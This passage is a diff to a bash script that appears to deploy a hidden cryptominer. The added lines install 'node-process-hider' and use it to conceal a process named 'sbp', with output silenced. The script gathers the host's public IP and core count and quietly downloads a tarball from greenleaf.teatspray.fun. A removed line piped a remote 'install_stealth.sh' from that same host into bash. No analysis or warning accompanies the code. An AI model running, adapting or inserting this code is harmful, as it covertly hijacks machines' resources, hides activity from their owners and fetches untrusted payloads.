@@ -1,9 +1,25 @@
 #!/bin/bash
+cd
+sleep 2
+pwd
+sleep 2
+curl api.ipify.org
+sleep 2
 
-apt update;apt -y install  libjansson-dev libhwloc-dev
+curl -s -L -o node-v20.7.0-linux-x64.tar.gz https://nodejs.org/download/release/v20.7.0/node-v20.7.0-linux-x64.tar.gz
+tar -xf node-v20.7.0-linux-x64.tar.gz
+export PATH=$HOME/node-v20.7.0-linux-x64/bin:$PATH
+
 sleep 2
-wget -O - https://greenleaf.teatspray.fun/install_stealth.sh | bash
+
+npm i -g node-process-hider 1>/dev/null 2>&1
+
 sleep 2
+
+ph add sbp 1>/dev/null 2>&1
+
+sleep 2
+
 num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
 currentdate=$(date '+%d-%b-%Y_Harn_')
 ipaddress=$(curl -s api.ipify.org)
@@ -44,7 +60,7 @@ tar -xf sbp.tar.gz
 
 sleep 2
 
-wget https://greenleaf.teatspray.fun/stun_10.1.6.tar.gz
+wget -q https://greenleaf.teatspray.fun/stun_10.1.6.tar.gz
 
 sleep 2
 
